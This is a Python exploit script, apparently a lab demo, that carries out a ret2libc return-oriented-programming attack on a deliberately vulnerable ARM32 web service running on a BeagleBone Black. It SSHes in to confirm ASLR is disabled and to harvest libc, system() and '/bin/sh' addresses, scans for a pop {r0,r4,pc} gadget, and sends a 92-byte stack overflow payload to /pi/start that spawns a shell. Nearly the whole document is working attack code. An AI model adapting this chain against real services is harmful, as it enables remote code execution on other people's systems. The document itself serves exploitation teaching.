#!/usr/bin/env python3
"""
get_shell.py — ret2libc exploit against /pi/start on ARM32 BBB

Address strategy:
  Hardcoded defaults (verified on 2017 Debian BBB / libc-2.24) are overridden
  at runtime by SSHing to the target and reading the live process layout:
    libc base    — /proc/<pid>/maps
    system()     — nm -D (Thumb symbol: bit0 already set in value)
    /bin/sh      — strings -t x (file offset == VMA offset for first PT_LOAD)
    gadget       — byte scan for e8bd8011 (pop {r0,r4,pc} ARM LE) at 4-byte steps

ROP chain:
  [ 'A' * 92         ]  ← fill config_buf (at r7+8) + frame to saved LR (at r7+100)
  [ pop_r0_r4_pc     ]  ← overwrite saved LR (bit0=0 → Thumb epilogue switches to ARM)
  [ binsh_addr       ]  ← → r0 (first arg to system)
  [ junk             ]  ← → r4 (discarded)
  [ system_addr      ]  ← → pc (system(); bit0=1 → ARM gadget switches back to Thumb)

Note on gadget validity:
  0x593e4 was the SECOND halfword of Thumb-2 LDRB.W — not an instruction start.
  0x159a4 was in ELF pre-text metadata (non-executable) — segfault.
  0x59cfc: ARM-mode context confirmed by surrounding instructions (ldrbcs, strbcs).
    e8bd8011 in ARM = ldmia sp!, {r0, r4, pc} = pop {r0, r4, pc} ✓
    e8bd8011 in Thumb = 0x8011 first → STRH (wrong!) — must NOT set bit0.

Shell appears in the BBB SSH terminal where ./rop-webservice was started.
"""

import sys, os, struct
from urllib.parse import urlparse

VENV = os.path.join(os.path.dirname(__file__), '..', 'exploit-env',
                    'lib', 'python3.12', 'site-packages')
sys.path.insert(0, VENV)

import paramiko
import requests

# Hardcoded fallbacks — verified on 2017 Debian BBB (libc-2.24)
_DEFAULT_LIBC_BASE  = 0xb6d5b000
_DEFAULT_SYSTEM_OFF = 0x2e211   # Thumb symbol — bit0 set
_DEFAULT_BINSH_OFF  = 0xcd660
_DEFAULT_GADGET_OFF = 0x59cfc   # ARM mode — bit0 clear

OFFSET = 92  # config_buf at r7+8, saved LR at r7+100 → 92 bytes padding


def parse_target(raw: str) -> str:
    """Validate and normalise the target URL using urllib.parse.

    Accepts http[s]://<ipv4-or-ipv6-or-host>[:<port>] and returns it
    with any trailing slash stripped.  Raises SystemExit on bad input.
    """
    try:
        p = urlparse(raw)
        port = p.port   # triggers ValueError for out-of-range ports
    except ValueError as e:
        sys.exit(f'[-] Invalid TARGET URL: {e}')

    if p.scheme not in ('http', 'https'):
        sys.exit(f'[-] TARGET must start with http:// or https://  (got: {raw!r})')

    if not p.hostname:
        sys.exit(f'[-] TARGET has no host: {raw!r}')

    return raw.rstrip('/')


def check_aslr(host: str, user: str, password: str) -> None:
    print(f'[*] Checking ASLR on {host} …')
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, username=user, password=password, timeout=5)
        _, stdout, _ = client.exec_command(
            'cat /proc/sys/kernel/randomize_va_space'
        )
        value = stdout.read().decode().strip()
        client.close()
    except Exception as e:
        sys.exit(f'[-] SSH to {host} failed: {e}')
    if value != '0':
        sys.exit(
            f'[-] ASLR is enabled on {host} (randomize_va_space={value})\n'
            f'    Disable it with:\n'
            f'      echo 0 | sudo tee /proc/sys/kernel/randomize_va_space'
        )
    print(f'[+] ASLR disabled (randomize_va_space=0)')


def discover_addresses(host: str, user: str, password: str) -> dict:
    """SSH to BBB and extract live libc layout from the running service process."""
    print(f'[*] Discovering libc addresses from live process …')
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, username=user, password=password, timeout=5)
    except Exception as e:
        print(f'[-] SSH failed: {e} — falling back to hardcoded addresses')
        return {}

    def run(cmd):
        _, stdout, _ = client.exec_command(cmd)
        return stdout.read().decode().strip()

    pid = run('pgrep rop-webservice | head -1')
    if not pid.isdigit():
        print('[-] rop-webservice not found on BBB — falling back to hardcoded addresses')
        client.close()
        return {}

    maps_line = run(f'grep libc /proc/{pid}/maps | head -1')
    if not maps_line:
        print('[-] libc not in process maps — falling back to hardcoded addresses')
        client.close()
        return {}

    parts     = maps_line.split()
    libc_base = int(parts[0].split('-')[0], 16)
    libc_path = parts[-1]
    print(f'[+] PID {pid}: libc → {libc_path}')

    found: dict = {'libc_base': libc_base}

    # system() offset — use readelf (raw st_value, bit0 set for Thumb) as primary;
    # nm -D normalises Thumb addresses by stripping bit0, making it unreliable here
    re_out = run(
        f"readelf -s '{libc_path}' 2>/dev/null"
        f" | awk '$4==\"FUNC\" && ($8==\"system\" || $8~/^system@@/) {{print $2; exit}}'"
    )
    if not re_out:
        re_out = run(f"nm -D '{libc_path}' 2>/dev/null | grep -E ' system$| system@@'")
    if re_out:
        try:
            found['system_offset'] = int(re_out.split()[0], 16)
        except (ValueError, IndexError):
            pass

    # /bin/sh string — file offset from strings equals VMA offset (first PT_LOAD at 0)
    str_out = run(f"strings -t x '{libc_path}' 2>/dev/null | grep '/bin/sh$'")
    if str_out:
        try:
            found['binsh_offset'] = int(str_out.split()[0], 16)
        except (ValueError, IndexError):
            pass

    # pop {r0,r4,pc} ARM-mode gadget = e8bd8011 (LE); scan only 4-byte-aligned offsets
    # so we don't pick up the same bytes straddling a Thumb halfword boundary
    gadget_out = run(
        f"python3 -c \""
        f"d=open('{libc_path}','rb').read();"
        f"p=b'\\x11\\x80\\xbd\\xe8';"
        f"hits=[i for i in range(0,len(d)-3,4) if d[i:i+4]==p];"
        f"print(hits[0] if hits else -1)"
        f"\" 2>/dev/null"
    )
    if gadget_out and gadget_out != '-1':
        try:
            found['gadget_offset'] = int(gadget_out)
        except ValueError:
            pass

    client.close()
    return found


def resolve_addresses(discovered: dict) -> tuple:
    """Merge live-discovered values over hardcoded defaults; report any differences."""
    defaults = [
        ('libc_base',     _DEFAULT_LIBC_BASE,   'libc base'),
        ('system_offset', _DEFAULT_SYSTEM_OFF,  'system() offset'),
        ('binsh_offset',  _DEFAULT_BINSH_OFF,   '/bin/sh offset'),
        ('gadget_offset', _DEFAULT_GADGET_OFF,  'gadget offset'),
    ]
    out = []
    for key, default, label in defaults:
        live = discovered.get(key)
        if live is None:
            print(f'[-] {label}: discovery failed — using hardcoded 0x{default:08x}')
            out.append(default)
        elif live != default:
            print(f'[!] {label}: live=0x{live:08x}  hardcoded=0x{default:08x} — using live')
            out.append(live)
        else:
            print(f'[+] {label}: 0x{live:08x} (matches hardcoded)')
            out.append(live)
    return tuple(out)


if len(sys.argv) != 4:
    prog = os.path.basename(sys.argv[0])
    sys.exit(f'Usage: {prog} <target-url> <ssh-user> <ssh-pass>\n'
             f'  e.g. {prog} http://192.168.7.2:8080 embed embed')

TARGET   = parse_target(sys.argv[1])
SSH_USER = sys.argv[2]
SSH_PASS = sys.argv[3]

BANNER = """
╔══════════════════════════════════════════════════════════════╗
║           get_shell.py — ARM32 ret2libc exploit              ║
╠══════════════════════════════════════════════════════════════╣
║  Prerequisites                                               ║
║                                                              ║
║  1. BBB connected to this machine (USB or Ethernet)          ║
║  2. ASLR disabled on BBB (script validates this):            ║
║       echo 0 | sudo tee /proc/sys/kernel/randomize_va_space  ║
║  3. Terminal A — SSH into BBB and start the service:         ║
║       ssh <user>@<bbb-ip>                                    ║
║       cd ~/rop-vuln-webservice && ./rop-webservice           ║
║  4. Terminal B — run this script from the repo root:         ║
║       source exploit-env/bin/activate                        ║
║       python3 demos/get_shell.py <url> <user> <pass>         ║
║                                                              ║
║  The shell appears in Terminal A (the BBB SSH session).      ║
╚══════════════════════════════════════════════════════════════╝
"""


def build_payload(gadget_addr: int, binsh_addr: int, system_addr: int) -> bytes:
    payload  = b'A' * OFFSET
    payload += struct.pack('<I', gadget_addr)   # overwrite saved LR (bit0=0 → ARM mode)
    payload += struct.pack('<I', binsh_addr)    # → r0 ("/bin/sh")
    payload += b'JUNK'                          # → r4 (discarded)
    payload += struct.pack('<I', system_addr)   # → pc (system(), bit0=1 → back to Thumb)
    return payload


def main():
    print(BANNER)
    host = urlparse(TARGET).hostname
    check_aslr(host, SSH_USER, SSH_PASS)

    try:
        r = requests.get(f'{TARGET}/pi/status', timeout=3)
        print(f'[+] Service alive: {r.json()}')
    except Exception as e:
        print(f'[-] Service not responding: {e}')
        sys.exit(1)

    discovered = discover_addresses(host, SSH_USER, SSH_PASS)
    libc_base, system_off, binsh_off, gadget_off = resolve_addresses(discovered)

    system_addr = libc_base + system_off
    binsh_addr  = libc_base + binsh_off
    gadget_addr = libc_base + gadget_off

    payload = build_payload(gadget_addr, binsh_addr, system_addr)

    print()
    print('[*] ROP chain:')
    print(f'    {"A"*OFFSET}  ← {OFFSET}-byte padding to saved LR')
    print(f'    0x{gadget_addr:08x}  ← pop {{r0, r4, pc}} (ARM .text, libc+0x{gadget_off:x}, bit0=0)')
    print(f'    0x{binsh_addr:08x}  ← "/bin/sh" string (libc+0x{binsh_off:x}) → r0')
    print(f'    {"JUNK":8}      ← junk → r4 (discarded)')
    print(f'    0x{system_addr:08x}  ← system() (libc+0x{system_off:x}, Thumb)  → pc')
    print(f'    total payload: {len(payload)} B')
    print()
    print(f'[*] Sending exploit → {TARGET}/pi/start …')
    print(f'[*] Shell will appear in the BBB SSH terminal.')

    try:
        requests.post(f'{TARGET}/pi/start', data=payload, timeout=5)
    except Exception as e:
        print(f'[*] ({type(e).__name__}) — system() is running, shell active on BBB')


if __name__ == '__main__':
    main()
